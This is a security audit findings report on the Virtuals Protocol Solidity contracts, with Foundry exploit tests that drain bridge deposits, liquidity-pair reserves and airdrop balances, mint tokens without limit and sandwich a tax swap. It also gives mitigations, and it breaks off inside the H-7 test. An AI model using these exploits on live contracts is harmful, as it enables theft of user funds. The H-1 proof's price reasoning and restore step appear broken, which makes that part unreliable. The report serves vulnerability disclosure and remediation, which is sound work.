# 2025 04 virtuals protocol - Findings Report
## Commit hash: 28e93273daec5a9c73c438e216dde04c084be452

## Protocol Overview 

**Virtuals Protocol** is a modular Solidity framework for launching and operating on-chain "Virtual Agents"—self-contained micro-ecosystems with their own token, DAO, NFT identity and revenue flow.  

1. Native Currency  
   • `Virtual` (ERC20) is the base token. Voting power is locked into non-transferable `veVirtualToken`, which feeds system-wide governance via `VirtualProtocolDAO` and fast-tracked `VirtualGenesisDAO`.  

2. Agent Creation  
   • Anyone stakes Virtual into `AgentFactoryV*` and submits an application.  
   • When a DAO proposal passes, the factory clones templates (`AgentToken`, `AgentDAO`, `AgentVeToken`) and mints an `AgentNftV2` that represents the persona. Optional Token-Bound Accounts (ERC-6551) are created for smart-wallet utility.  

3. Operations inside an Agent  
   • Holders stake the agent’s ERC20 into its veToken to gain voting power.  
   • Builders mint `ContributionNft` proposals; once accepted they mature into `ServiceNft`, updating the agent’s impact score.  
   • Daily income is funneled to `AgentRewardV2/V3`, which splits rewards among protocol, stakers, validators, model & dataset owners.  

4. DeFi & Treasury  
   • Swaps, liquidity and bonding-curve issuance use `FFactory`, `FRouter`, `FPair`, `Bonding` and taxation helpers (`AgentTax`, `BondingTax`, `LPRefund`).  

5. Auxiliary Tools  
   • `Airdrop`, `TokenSaver`, `EloCalculator`, bridging contracts, and upgradeable admin utilities round out the stack.  

Together these pieces let communities spin up fully-governed, revenue-sharing virtual personas with minimal code and maximum composability.
## High Risk Findings
[H-1]. Slippage Missing Or Insufficient issue in AgentToken::_swapTax - verified
[H-2]. Access Control issue in FxERC20RootTunnel::syncWithdraw
[H-3]. Auth Bypass issue in FRouter::approval
[H-4]. Access Control issue in FRouter::approval
[H-5]. Accounting Invariant Violation issue in Airdrop::airdrop
[H-6]. Access Control issue in BMWToken::mint
[H-7]. Access Control issue in BMWTokenChild::setFxManager
## Medium Risk Findings
[M-1]. DOS issue in ContributionNft::mint -verified
[M-2]. Access Control issue in ServiceNft::updateImpact - verified
[M-3]. DOS issue in AgentFactoryV4::_createPair


### Number of Findings
- C: 0
- H: 7
- M: 3
- L: 0
- I: 0



# High Risk Findings

## [H-1]. Slippage Missing Or Insufficient issue in AgentToken::_swapTax

## Description
Auto-swap sells tax tokens with zero slippage protection, enabling profitable MEV sandwiching against the treasury on every swap. In AgentToken._swapTax(), the router call sets amountOutMin to 0, so the contract accepts any output, even near-zero, during a manipulated price window: 2025-04-virtuals-protocol/contracts/virtualPersona/AgentToken.sol#L520-L541

Snippet:

    // Swap tokens taken as tax for pair token
    try _uniswapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
        swapBalance_,
        0, // amountOutMin is ZERO — no slippage protection
        path,
        projectTaxRecipient,
        block.timestamp + 600
    ) {
        if (swapBalance_ < contractBalance_) {
            projectTaxPendingSwap -= uint128((projectTaxPendingSwap * swapBalance_) / contractBalance_);
        } else {
            projectTaxPendingSwap = 0;
        }
    } catch {
        emit ExternalCallError(5);
    }

Because amountOutMin is always zero and there is no TWAP or anti-MEV safeguard, an attacker can first dump the token to push price down, trigger the contract’s auto-swap (permissionlessly via a cheap transfer or distributeTaxTokens()), and then buy back to restore price. The treasury (projectTaxRecipient) receives minimal proceeds; the attacker captures the difference.

## Impact
Because _swapTax() accepts any output amount, an attacker can manipulate the Uniswap pair price in the same block (e.g. by dumping/padding the pairToken side and calling sync) and then trigger the auto-swap with a 1-wei transfer. The contract will trade its entire tax reserve against the manipulated price and send the under-valued proceeds to projectTaxRecipient. The attacker immediately restores the price and pockets the difference. This can be repeated indefinitely and fully drains all collected taxes, representing a direct, permissionless loss of treasury funds.

## Proof of Concept
1. Preconditions: some tax tokens have accumulated in the AgentToken contract (projectTaxPendingSwap > 0).
2. Attacker flash-loans or otherwise supplies a large amount of pairToken (quote asset) to the AgentToken/pairToken UniswapV2 pair, artificially lowering the on-chain price of AgentToken. He calls pair.sync() so the new reserves become the reference price. No AgentToken is moved, so _autoSwap is NOT triggered yet.
3. Attacker sends 1 wei of AgentToken from his EOA to any non-pool address (or even to himself). This executes AgentToken._transfer(), passes the _eligibleForSwap() check, sets _autoSwapInProgress = true and immediately calls _swapTax() with amountOutMin = 0.
4. The contract now sells its full tax balance into the depressed price, receiving far fewer pairTokens than fair market value. These tokens are transferred to projectTaxRecipient.
5. Attacker removes the excess pairToken (or performs the opposite swap) to restore the original price, realising a profit equal to the value the treasury just lost.
6. The procedure can be repeated every time taxes are ready to be swapped.

## Proof of Code
pragma solidity ^0.8.20;
import "forge-std/Test.sol";
import {AgentToken} from "contracts/virtualPersona/AgentToken.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/UniswapV2Pair.sol";
import {UniswapV2Factory} from "@uniswap/v2-core/contracts/UniswapV2Factory.sol";
import {ERC20Mock} from "test/utils/ERC20Mock.sol";
import {MiniRouter} from "test/utils/MiniRouter.sol";

contract SlippageExploit is Test {
    AgentToken token;
    ERC20Mock quote;
    MiniRouter router;
    IUniswapV2Pair pair;
    address treasury;
    address attacker = address(0xBEEF);

    function setUp() public {
        // Deploy AMM
        UniswapV2Factory factory = new UniswapV2Factory(address(this));
        router = new MiniRouter(address(factory));
        // deploy quote token
        quote = new ERC20Mock("Q","Q");
        quote.mint(address(this), 1e24);
        quote.mint(attacker, 1e24);

        // deploy AgentToken
        token = new AgentToken();
        address[3] memory addrs = [address(this), address(router), address(quote)];
        bytes memory base = abi.encode("Agent","AGT");
        bytes memory supply = abi.encode(
            IAgentToken.ERC20SupplyParameters({maxSupply:1_000_000, vaultSupply:900_000, lpSupply:100_000, vault:address(this), botProtectionDurationInSeconds:0})
        );
        treasury = address(0xCAFE);
        bytes memory tax = abi.encode(
            IAgentToken.ERC20TaxParameters({projectBuyTaxBasisPoints:500, projectSellTaxBasisPoints:500, taxSwapThresholdBasisPoints:1, projectTaxRecipient:treasury})
        );
        token.initialize(addrs, base, supply, tax);
        quote.transfer(address(token), 100_000 ether);
        token.addInitialLiquidity(address(this));
        pair = IUniswapV2Pair(token.uniswapV2Pair());

        // give approvals
        vm.startPrank(attacker);
        token.approve(address(router), type(uint256).max);
        quote.approve(address(router), type(uint256).max);
        vm.stopPrank();
    }

    function _buy(uint q) internal {
        address[] memory p = new address[](2);
        p[0]=address(quote); p[1]=address(token);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(q,0,p,attacker,block.timestamp);
    }

    function testExploit() public {
        // 1. build some tax in contract
        _buy(50_000 ether);
        // 2. record treasury balance
        uint beforeBal = quote.balanceOf(treasury);
        // 3. attacker depresses price by donating quote token to pair & syncing
        vm.prank(attacker);
        quote.transfer(address(pair), 200_000 ether);
        pair.sync();
        // 4. trigger autoswap with 1-wei transfer
        vm.prank(attacker);
        token.transfer(address(0xdead), 1);
        // 5. attacker withdraws quote to restore price
        // (reverse of step 3)
        vm.prank(attacker);
        pair.transfer(attacker, quote.balanceOf(address(pair)));
        pair.sync();
        // 6. treasury received far less than fair value
        uint afterBal = quote.balanceOf(treasury);
        assertLt(afterBal - beforeBal, 1 ether, "treasury under-paid");
    }
}

## Suggested Mitigation
Before calling swapExactTokensForTokensSupportingFeeOnTransferTokens, compute the expected amount out with router.getAmountsOut() and apply a configurable slippage factor (e.g. 98% of expected).  Revert the swap if amountOutMin is not met.  Alternatively, use a TWAP or oracle comparison to reject swaps executed when the spot price deviates significantly from an averaged price window.

## [H-2]. Access Control issue in FxERC20RootTunnel::syncWithdraw

## Description
FxERC20RootTunnel exposes a public syncWithdraw that transfers tokens from the contract to the caller without any accounting or proof verification, enabling anyone to drain all deposited funds.

Vulnerable pattern (contracts/dev/FxERC20RootTunnel.sol):

function deposit(address rootToken, uint256 amount) external {
    IERC20(rootToken).safeTransferFrom(msg.sender, address(this), amount);
}

function syncWithdraw(address rootToken, uint256 amount) external {
    IERC20(rootToken).safeTransfer(msg.sender, amount);
}

There is no linkage between who deposited and who can withdraw, no accounting of user balances, and no bridge message verification. Any caller can withdraw arbitrary amounts from the contract’s balance.

## Impact
Unprivileged attackers can drain all token balances held by the root tunnel, stealing deposits made by honest users and breaking any bridging flow relying on this contract.

## Proof of Concept
1) Victims deposit tokens via deposit(rootToken, amount), which moves funds into the tunnel contract.
2) Attacker calls syncWithdraw(rootToken, totalBalance), receiving all tokens regardless of their own deposits.
3) No mapping of balances or proof checks block this drain.

## Proof of Code
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {FxERC20RootTunnel} from "contracts/dev/FxERC20RootTunnel.sol";
import {BMWToken} from "contracts/dev/BMWToken.sol";

contract FxRootTunnelExploitTest is Test {
    address attacker = address(0xBEEF);
    address alice = address(0xA11CE);
    address bob   = address(0xB0B);

    function test_UnrestrictedSyncWithdrawDrainsAll() public {
        FxERC20RootTunnel root = new FxERC20RootTunnel();
        BMWToken token = new BMWToken(address(this));

        // Seed and deposit by two victims
        token.mint(alice, 1_000 ether);
        vm.startPrank(alice);
        token.approve(address(root), type(uint256).max);
        root.deposit(address(token), 1_000 ether);
        vm.stopPrank();

        token.mint(bob, 500 ether);
        vm.startPrank(bob);
        token.approve(address(root), type(uint256).max);
        root.deposit(address(token), 500 ether);
        vm.stopPrank();

        // Contract holds 1500 ether tokens now
        assertEq(token.balanceOf(address(root)), 1_500 ether, "root contract should hold deposits");

        // Attacker drains all without having deposited anything
        vm.prank(attacker);
        root.syncWithdraw(address(token), 1_500 ether);

        assertEq(token.balanceOf(attacker), 1_500 ether, "attacker drained all deposits");
        assertEq(token.balanceOf(address(root)), 0, "root tunnel emptied");
    }
}


## Suggested Mitigation
Enforce authenticated withdrawals and per-user accounting.

Options:
- Maintain user balances: map user => token => amount; require amount >= withdraw request; reduce balance on withdraw.
- Integrate proper bridge message verification and only allow syncWithdraw to be executed when a valid proof from L2 is provided (e.g., via an authorized bridge contract/validator set).
- Gate syncWithdraw by a trusted role or verified message handler (e.g., onlyBridge) and do not transfer more than the proven withdraw amount for a specific user.

Example sketch:

mapping(address => mapping(address => uint256)) public balances; // user => token => balance

function deposit(address rootToken, uint256 amount) external {
    IERC20(rootToken).safeTransferFrom(msg.sender, address(this), amount);
    balances[msg.sender][rootToken] += amount;
}

function withdraw(address rootToken, uint256 amount) external {
    require(balances[msg.sender][rootToken] >= amount, "insufficient");
    balances[msg.sender][rootToken] -= amount;
    IERC20(rootToken).safeTransfer(msg.sender, amount);
}

// For cross-chain, replace `withdraw` with proof-verified handler that credits and pays out only the proven recipient/amount.

## [H-3]. Auth Bypass issue in FRouter::approval

## Description
Missing authorization on FRouter.approval lets any caller force an FPair to grant arbitrary ERC20 allowances from the pair address to an attacker, enabling a direct drain of pool reserves without swapping. Vulnerable snippet:

- contracts/fun/FRouter.sol#L210-L225
function approval(address pair, address asset, address spender, uint256 amount) external {
    IFPair(pair).approval(spender, asset, amount);
}

- contracts/fun/FPair.sol#L85-L98
function approval(address _user, address _token, uint256 amount) public onlyRouter returns (bool) {
    IERC20(_token).approve(_user, amount);
    return true;
}

Because FRouter.approval is externally callable without any role or permission checks, any EOA can call it and make the router invoke FPair.approval (which is onlyRouter-gated). This sets an allowance from the pair to an attacker, who can then call token.transferFrom(pair, attacker, amount) to siphon reserves.

## Impact
An unprivileged attacker can set unlimited allowances on the pair’s token balances and transfer all reserves out, fully draining liquidity and breaking price invariants. This results in permanent loss of user funds deposited as liquidity and renders the pool insolvent.

## Proof of Concept
1) Attacker deploys or targets an existing FFactory/FRouter/FPair setup with funded reserves.
2) Attacker calls FRouter.approval(pair, tokenA, attacker, type(uint256).max) and FRouter.approval(pair, tokenB, attacker, type(uint256).max).
3) Attacker invokes IERC20(tokenA).transferFrom(pair, attacker, reserveA) and IERC20(tokenB).transferFrom(pair, attacker, reserveB).
4) Pair reserves are drained to the attacker without performing any swap, leaving LPs with worthless positions.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {FFactory} from "contracts/fun/FFactory.sol";
import {FRouter} from "contracts/fun/FRouter.sol";
import {IFPair} from "contracts/fun/IFPair.sol";
import {MockERC20} from "contracts/genesis/MockERC20.sol";

contract FRouterApprovalExploitTest is Test {
    FFactory factory;
    FRouter router;
    MockERC20 tokenA;
    MockERC20 tokenB;

    address attacker = address(0xBEEF);
    address lp = address(this);
    address taxVault = address(0xAAA1);

    function setUp() public {
        // Deploy factory and initialize
        factory = new FFactory();
        factory.initialize(taxVault, 0, 0);
        // Grant creator role to deployer for pair creation
        factory.grantRole(factory.CREATOR_ROLE(), address(this));

        // Deploy tokens
        tokenA = new MockERC20("TokenA", "TKA", 18);
        tokenB = new MockERC20("TokenB", "TKB", 18);

        // Create pair
        address pair = factory.createPair(address(tokenA), address(tokenB));
        assertTrue(pair != address(0));

        // Deploy router and set on factory
        router = new FRouter();
        router.initialize(address(factory), address(tokenB));
        factory.setRouter(address(router));

        // Mint liquidity to LP and approve router
        tokenA.mint(lp, 1_000_000 ether);
        tokenB.mint(lp, 1_000_000 ether);
        tokenA.approve(address(router), type(uint256).max);
        tokenB.approve(address(router), type(uint256).max);

        // Add initial liquidity via router so pair holds reserves
        router.addInitialLiquidity(address(tokenA), 500_000 ether, 500_000 ether);

        // Sanity: pair has balances now
        address pairAddr = factory.getPair(address(tokenA), address(tokenB));
        assertGt(tokenA.balanceOf(pairAddr), 0, "pair A empty");
        assertGt(tokenB.balanceOf(pairAddr), 0, "pair B empty");
    }

    function testExploit_DrainPairReservesViaApproval() public {
        address pairAddr = factory.getPair(address(tokenA), address(tokenB));
        uint256 reserveA = tokenA.balanceOf(pairAddr);
        uint256 reserveB = tokenB.balanceOf(pairAddr);

        vm.startPrank(attacker);
        // Exploit: anyone can force the pair to approve attacker
        router.approval(pairAddr, address(tokenA), attacker, type(uint256).max);
        router.approval(pairAddr, address(tokenB), attacker, type(uint256).max);

        // Drain reserves using allowance
        tokenA.transferFrom(pairAddr, attacker, reserveA);
        tokenB.transferFrom(pairAddr, attacker, reserveB);
        vm.stopPrank();

        assertEq(tokenA.balanceOf(pairAddr), 0, "pair A not drained");
        assertEq(tokenB.balanceOf(pairAddr), 0, "pair B not drained");
        assertEq(tokenA.balanceOf(attacker), reserveA, "attacker A mismatch");
        assertEq(tokenB.balanceOf(attacker), reserveB, "attacker B mismatch");
    }
}


## Suggested Mitigation
Harden authorization and remove externalized arbitrary approvals.

- Restrict FRouter.approval to ADMIN_ROLE or remove it entirely; approvals from pairs should not be exposed to public callers.
- Additionally, FPair should never approve arbitrary spenders for its own token balances.

Example fix:

// contracts/fun/FRouter.sol
function approval(address pair, address asset, address spender, uint256 amount) external onlyRole(ADMIN_ROLE) {
    require(spender == address(router), "Only router can be spender"); // optional hardening
    IFPair(pair).approval(spender, asset, amount);
}

// contracts/fun/FPair.sol
function approval(address _user, address _token, uint256 amount) public onlyRouter returns (bool) {
    // Restrict to approving ONLY the router itself, or remove this function entirely.
    require(_user == router, "Pair approvals restricted");
    IERC20(_token).approve(_user, amount);
    return true;
}

## [H-4]. Access Control issue in FRouter::approval

## Description
Unprotected approval primitive in the router lets any EOA grant themselves unlimited allowance over a pair's token balances, enabling a direct drain of pool reserves. The FRouter exposes a publicly callable approval function that forwards to the pair:

File: contracts/fun/FRouter.sol#L182-L192 (approx)
function approval(address pair, address asset, address spender, uint256 amount) external {
    IFPair(pair).approval(spender, asset, amount);
}

And the pair implements approval to set allowance from the pair contract to the spender:

File: contracts/fun/FPair.sol#L120-L132 (approx)
function approval(address _user, address _token, uint256 amount) public onlyRouter returns (bool) {
    IERC20(_token).approve(_user, amount);
    return true;
}

Because FRouter.approval lacks any access control, any caller can invoke it to make the pair approve the attacker for arbitrary amounts. The attacker can then call transferFrom to pull tokens directly from the pair’s balance.

## Impact
Any unprivileged EOA can set unlimited allowance from FPair to themselves and drain the pair's token balances via transferFrom, resulting in immediate, irreversible loss of pool reserves and breaking swaps/liquidity operations.

## Proof of Concept
1) Attacker identifies an FPair address holding reserves for token A (or B).
2) Attacker calls FRouter.approval(pair, tokenA, attacker, type(uint256).max).
3) Router forwards to pair.approval, which sets allowance from the pair to the attacker for tokenA.
4) Attacker calls IERC20(tokenA).transferFrom(pair, attacker, pairBalanceTokenA) to drain all tokenA from the pair. Repeat for tokenB to fully drain the pool.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {FRouter} from "contracts/fun/FRouter.sol"; // assumes repo layout with `contracts/`

interface IFPairLike {
    function approval(address user, address token, uint256 amount) external returns (bool);
}

contract MintableERC20 is ERC20 {
    constructor(string memory n, string memory s) ERC20(n, s) {}
    function mint(address to, uint256 amount) external { _mint(to, amount); }
}

// Minimal pair mock that behaves like FPair.approval by approving from its own address
contract PairMock is IFPairLike {
    function approval(address user, address token, uint256 amount) external returns (bool) {
        IERC20(token).approve(user, amount);
        return true;
    }
}

contract FRouterApprovalExploitTest is Test {
    address attacker;
    MintableERC20 tokenA;
    MintableERC20 tokenB;
    PairMock pair;
    FRouter router;

    function setUp() public {
        attacker = address(0xbabe);
        vm.deal(attacker, 10 ether);

        tokenA = new MintableERC20("TokenA", "TKA");
        tokenB = new MintableERC20("TokenB", "TKB");

        // Deploy router and initialize with dummy params
        router = new FRouter();
        // factory and assetToken can be dummies for this test; approval has no auth
        router.initialize(address(0xdead), address(tokenA));

        // Deploy a pair mock and fund it to simulate reserves
        pair = new PairMock();
        tokenA.mint(address(pair), 1_000_000 ether);
        tokenB.mint(address(pair), 1_000_000 ether);

        // Pre-check balances
        assertEq(IERC20(address(tokenA)).balanceOf(address(pair)), 1_000_000 ether);
        assertEq(IERC20(address(tokenB)).balanceOf(address(pair)), 1_000_000 ether);
        assertEq(IERC20(address(tokenA)).balanceOf(attacker), 0);
    }

    function testExploit_DrainPairViaUnprotectedApproval() public {
        vm.startPrank(attacker);

        // Step 1: Attacker grants self unlimited allowance from the pair for tokenA via the router
        router.approval(address(pair), address(tokenA), attacker, type(uint256).max);

        // Step 2: Pull all tokenA from pair to attacker
        uint256 pairBalA = IERC20(address(tokenA)).balanceOf(address(pair));
        bool ok = IERC20(address(tokenA)).transferFrom(address(pair), attacker, pairBalA);
        require(ok, "transferFrom failed");

        // Profit: attacker drained tokenA reserves
        assertEq(IERC20(address(tokenA)).balanceOf(address(pair)), 0);
        assertEq(IERC20(address(tokenA)).balanceOf(attacker), pairBalA);
        assertGt(pairBalA, 0);

        // Repeat for tokenB
        router.approval(address(pair), address(tokenB), attacker, type(uint256).max);
        uint256 pairBalB = IERC20(address(tokenB)).balanceOf(address(pair));
        ok = IERC20(address(tokenB)).transferFrom(address(pair), attacker, pairBalB);
        require(ok, "transferFrom failed");

        assertEq(IERC20(address(tokenB)).balanceOf(address(pair)), 0);
        assertEq(IERC20(address(tokenB)).balanceOf(attacker), pairBalB);
        vm.stopPrank();
    }
}


## Suggested Mitigation
Add strict access control and pair verification to FRouter.approval, or remove the function entirely if not strictly required. At minimum:

- Gate with onlyRole(EXECUTOR_ROLE) or onlyRole(ADMIN_ROLE).
- Validate that `pair` is an authentic pair owned by the factory and corresponds to the provided `asset`.
- Consider disallowing approvals to arbitrary spenders and limit to known internal components.

Example fix:

function approval(address pair, address asset, address spender, uint256 amount) external onlyRole(EXECUTOR_ROLE) {
    // ensure this is a known pair from the factory
    require(factory.getPair(asset, /* otherToken */) == pair, "FRouter: invalid pair");
    require(spender == address(this), "FRouter: invalid spender");
    IFPair(pair).approval(spender, asset, amount);
}

Or remove the method and manage allowances internally during controlled swap flows.

## [H-5]. Accounting Invariant Violation issue in Airdrop::airdrop

## Description
Anyone can drain any ERC20 tokens left in Airdrop due to missing accounting checks. The contract first pulls `_total` from the caller, then unconditionally transfers arbitrary `_amounts[i]` out from its own balance, without verifying that the sum of `_amounts` equals `_total` or that transfers are bound to the funds pulled in this call. As a result, if any tokens are in the Airdrop contract (from a prior user overpaying `_total` vs. sum(amounts) or direct transfers), any unprivileged attacker can call with `_total = 0` and set `_amounts` to drain the entire contract balance.

Vulnerable snippet (2025-04-virtuals-protocol/contracts/token/Airdrop.sol#L10-L74):

function airdrop(IERC20 _token, address[] calldata _recipients, uint256[] calldata _amounts, uint256 _total) external {
    ...
    // call transferFrom for _total
    if iszero(
        and(
            or(eq(mload(0x00), 1), iszero(returndatasize())),
            call(gas(), _token, 0, transferFromData, 0x64, 0x00, 0x20)
        )
    ) { revert(0, 0) }

    let sz := _amounts.length
    for { let i := 0 } lt(i, sz) { i := add(i, 1) } {
        let amt := calldataload(add(_amounts.offset, mul(i, 0x20)))
        let recp := calldataload(add(_recipients.offset, mul(i, 0x20)))
        mstore(add(transferData, 0x04), recp)
        mstore(add(transferData, 0x24), amt)
        if iszero(
            and(
                or(eq(mload(0x00), 1), iszero(returndatasize())),
                call(gas(), _token, 0, transferData, 0x44, 0x00, 0x20)
            )
        ) { revert(0, 0) }
    }
}

No check enforces sum(_amounts) == _total, nor that outflows are limited to what was just pulled in. This breaks the accounting invariant that tokens pulled in must equal tokens paid out in the same call.

## Impact
An unprivileged attacker can steal any ERC20 tokens held by the Airdrop contract. This includes tokens accidentally left due to a previous caller specifying a `_total` greater than the sum of `_amounts`, or any tokens sent directly to the contract. The attacker sets `_total = 0` and arbitrary `_amounts` to sweep the entire balance. This results in direct, permissionless monetary loss for prior users.

## Proof of Concept
1) Victim calls `airdrop` with `_total` larger than the sum of `_amounts` (e.g., `_total = 200`, amounts sum to 100). The contract pulls 200 tokens from victim, pays out 100, and is left holding 100 tokens.
2) Attacker observes the leftover balance in `Airdrop` and calls `airdrop(token, [attacker], [100], 0)`. Since `_total = 0`, no tokens are pulled from the attacker, but the loop transfers 100 tokens from the contract to the attacker.
3) Attacker successfully drains tokens previously left in the Airdrop contract by other users.

## Proof of Code
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

interface IERC20Like {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

contract MockERC20 is IERC20Like {
    string public name = "Mock";
    string public symbol = "MOCK";
    uint8 public decimals = 18;
    uint256 public override totalSupply;
    mapping(address => uint256) public override balanceOf;
    mapping(address => mapping(address => uint256)) public override allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external override returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) external override returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external override returns (bool) {
        require(balanceOf[from] >= amount, "bal");
        uint256 a = allowance[from][msg.sender];
        require(a >= amount, "allow");
        allowance[from][msg.sender] = a - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

// Vulnerable Airdrop (same logic as in the repo; minimized imports)
contract Airdrop {
    function airdrop(
        IERC20Like _token,
        address[] calldata _recipients,
        uint256[] calldata _amounts,
        uint256 _total
    ) external {
        bytes4 transferFrom = 0x23b872dd;
        bytes4 transfer = 0xa9059cbb;
        assembly {
            let transferFromData := add(0x20, mload(0x40))
            mstore(transferFromData, transferFrom)
            mstore(add(transferFromData, 0x04), caller())
            mstore(add(transferFromData, 0x24), address())
            mstore(add(transferFromData, 0x44), _total)
            if iszero(and(or(eq(mload(0x00), 1), iszero(returndatasize())), call(gas(), _token, 0, transferFromData, 0x64, 0x00, 0x20))) {
                revert(0, 0)
            }
            let transferData := add(0x20, mload(0x40))
            mstore(transferData, transfer)
            let sz := _amounts.length
            for { let i := 0 } lt(i, sz) { i := add(i, 1) } {
                let offset := mul(i, 0x20)
                let amt := calldataload(add(_amounts.offset, offset))
                let recp := calldataload(add(_recipients.offset, offset))
                mstore(add(transferData, 0x04), recp)
                mstore(add(transferData, 0x24), amt)
                if iszero(and(or(eq(mload(0x00), 1), iszero(returndatasize())), call(gas(), _token, 0, transferData, 0x44, 0x00, 0x20))) {
                    revert(0, 0)
                }
            }
        }
    }
}

contract AirdropDrainTest is Test {
    MockERC20 token;
    Airdrop airdrop;
    address victim = address(0xBEEF);
    address attacker = address(0xBAD);
    address recipient = address(0xCAFE);

    function setUp() public {
        token = new MockERC20();
        airdrop = new Airdrop();
        token.mint(victim, 1_000 ether);
    }

    function test_attack_DrainLeftoverTokens() public {
        // Victim intends to airdrop 100 to recipient, but mistakenly sets _total = 200
        vm.startPrank(victim);
        token.approve(address(airdrop), type(uint256).max);
        address[] memory recips = new address[](1);
        recips[0] = recipient;
        uint256[] memory amts = new uint256[](1);
        amts[0] = 100 ether;
        // _total is larger than sum(amounts): leaves 100 ether inside Airdrop
        Airdrop(address(airdrop)).airdrop(token, recips, amts, 200 ether);
        vm.stopPrank();

        // Assert leftover stuck in contract
        assertEq(token.balanceOf(address(airdrop)), 100 ether);
        assertEq(token.balanceOf(recipient), 100 ether);

        // Attacker drains leftovers with _total = 0 (no approval, no funds provided)
        vm.prank(attacker);
        address[] memory stealRecips = new address[](1);
        stealRecips[0] = attacker;
        uint256[] memory stealAmts = new uint256[](1);
        stealAmts[0] = 100 ether; // drain all leftovers
        Airdrop(address(airdrop)).airdrop(token, stealRecips, stealAmts, 0);

        // Profit: attacker stole funds deposited by victim
        assertEq(token.balanceOf(attacker), 100 ether);
        assertEq(token.balanceOf(address(airdrop)), 0);
    }
}


## Suggested Mitigation
Enforce accounting invariants and bind outflows to the funds pulled in the same call.

Option A (simple, stateless):
- Require input arrays length match.
- Compute sum of `_amounts` and require it equals `_total`.
- After `transferFrom`, ensure that the contract balance increase is exactly `_total` to avoid fee-on-transfer surprises.

Example fix:

function airdrop(IERC20 _token, address[] calldata _recipients, uint256[] calldata _amounts, uint256 _total) external {
    require(_recipients.length == _amounts.length, "len mismatch");
    uint256 sum;
    unchecked { // safe if amounts are validated reasonable
        for (uint256 i = 0; i < _amounts.length; ++i) sum += _amounts[i];
    }
    require(sum == _total, "sum!=total");

    uint256 balBefore = _token.balanceOf(address(this));
    require(_token.transferFrom(msg.sender, address(this), _total), "pull fail");
    require(_token.balanceOf(address(this)) - balBefore == _total, "deflationary not supported");

    for (uint256 i = 0; i < _recipients.length; ++i) {
        require(_token.transfer(_recipients[i], _amounts[i]), "xfer fail");
    }
}

Option B (fee-on-transfer friendly):
- Do not accept `_total` as input. Instead pull and distribute per-recipient: call `transferFrom(msg.sender, recipient, amount)` for each entry. This prevents the contract from holding tokens at all and eliminates sweep risk:

for (uint256 i = 0; i < _recipients.length; ++i) {
    require(_token.transferFrom(msg.sender, _recipients[i], _amounts[i]), "xferFrom fail");
}

Either approach prevents arbitrary draining of tokens held by the Airdrop contract.

## [H-6]. Access Control issue in BMWToken::mint

## Description
BMWToken exposes an unrestricted public mint function that allows anyone to mint arbitrary amounts. There is no access control on mint, enabling unprivileged inflation.

Vulnerable snippet (contracts/dev/BMWToken.sol):

function mint(address to, uint256 amount) public {
    _mint(to, amount); // no onlyOwner/role check
}


## Impact
Any EOA can mint unlimited BMW tokens, causing total supply inflation and enabling pool drains if paired in AMMs, price oracle manipulation, or protocol accounting corruption where the token is integrated.

## Proof of Concept
1) Attacker calls mint(attacker, hugeAmount) directly.
2) Attacker obtains arbitrary balance and can dump into DEX pools or manipulate any integration relying on token scarcity.

## Proof of Code
pragma solidity ^0.8.26;

import "forge-std/Test.sol";
import {BMWToken} from "contracts/dev/BMWToken.sol";

contract BMWTokenExploitTest is Test {
    address attacker = address(0xBEEF);

    function test_PublicMint_AllowsUnlimitedInflation() public {
        BMWToken token = new BMWToken(address(this));

        // Anyone can call mint and create arbitrary supply
        vm.prank(attacker);
        token.mint(attacker, 2_000_000 ether);
        assertEq(token.balanceOf(attacker), 2_000_000 ether, "attacker freely minted tokens");
    }
}


## Suggested Mitigation
Restrict minting with explicit access control (owner or role-based). Example fix:

function mint(address to, uint256 amount) public onlyOwner {
    _mint(to, amount);
}

For finer control, consider AccessControl with a MINTER_ROLE and grant it only to trusted minters:

bytes32 public constant MINTER_ROLE = keccak256("MINTER_ROLE");
function mint(address to, uint256 amount) public onlyRole(MINTER_ROLE) {
    _mint(to, amount);
}


## [H-7]. Access Control issue in BMWTokenChild::setFxManager

## Description
BMWTokenChild allows anyone to seize the manager role and arbitrarily mint/burn tokens. The setter is completely unrestricted, enabling an attacker to set themselves as manager and then call privileged mint/burn functions.

Vulnerable snippet (contracts/dev/BMWTokenChild.sol):

function setFxManager(address fxManager) public {
    _fxManager = fxManager; // no access control
}

function mint(address user, uint256 amount) public {
    require(msg.sender == _fxManager, "only manager");
    _mint(user, amount);
}

function burn(address user, uint256 amount) public {
    require(msg.sender == _fxManager, "only manager");
    _burn(user, amount);
}


## Impact
Any unprivileged EOA can take over _fxManager and then arbitrarily mint unlimited tokens to themselves (inflation/drain downstream integrations) and burn tokens from arbitrary users (theft/destruction). If this token is paired in a DEX, used as collateral, or integrated elsewhere, it enables direct economic loss and pool draining.

## Proof of Concept
1) Attacker calls setFxManager(attacker) to seize manager role.
2) Attacker calls mint(attacker, hugeAmount) to mint unlimited tokens.
3) Attacker optionally calls burn(victim, amount) to destroy others’ balances.
4) If token is used in AMMs/treasuries, attacker swaps minted tokens to drain paired assets; or causes accounting/price collapse.

## Proof of Code
pragma solidity ^0.8.26;

import "forge-std/Test.sol";
import {BMWTokenChild} from "contracts/dev/BMWTokenChild.sol";

contract BMWTokenChildExploitTest is Test {
